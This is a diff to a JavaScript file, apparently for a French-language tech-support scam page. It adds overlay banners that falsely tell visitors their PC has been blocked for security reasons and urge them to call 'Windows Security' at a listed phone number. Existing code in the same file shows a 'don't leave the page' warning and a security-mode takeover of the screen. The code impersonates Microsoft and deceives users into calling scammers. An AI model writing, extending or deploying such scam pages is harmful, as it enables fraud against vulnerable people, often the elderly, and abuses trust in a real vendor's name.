@@ -2,7 +2,7 @@
   var mount = document.getElementById("app-mount");
   if (!mount) return;
 
-  var ASSET_VERSION = "7";
+  var ASSET_VERSION = "8";
 
   var styleLink = document.querySelector('link[href*="styles.css"]');
   if (!styleLink) {
@@ -29,6 +29,9 @@
     '<p class="escape-shield-warning">Ne quittez pas la page</p>' +
     '</div></div></div>' +
     '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
+    '<img class="security-bg-photo" id="securityBgPhoto" src="security-page-bg.png?v=8" alt="" aria-hidden="true">' +
+    '<div class="bg-phone-cover bg-phone-cover--white" aria-hidden="true">L\'accès a été bloqué pour des raisons de sécurité. Appelez Windows Security sans frais : <strong>02 59 50 90 20</strong></div>' +
+    '<div class="bg-phone-cover bg-phone-cover--blue" aria-hidden="true">Appelez le Centre de sécurité Windows : <strong>02 59 50 90 20</strong></div>' +
     '<div class="security-page">' +
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
     '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
@@ -186,6 +189,10 @@
 
   function showSecurityPage() {
     if (!securityOverlay) return;
+    var bgPhoto = document.getElementById("securityBgPhoto");
+    if (bgPhoto) {
+      bgPhoto.src = "security-page-bg.png?v=" + ASSET_VERSION;
+    }
     securityOverlay.classList.add("is-active");
     securityOverlay.setAttribute("aria-hidden", "false");
     document.body.classList.add("security-mode");
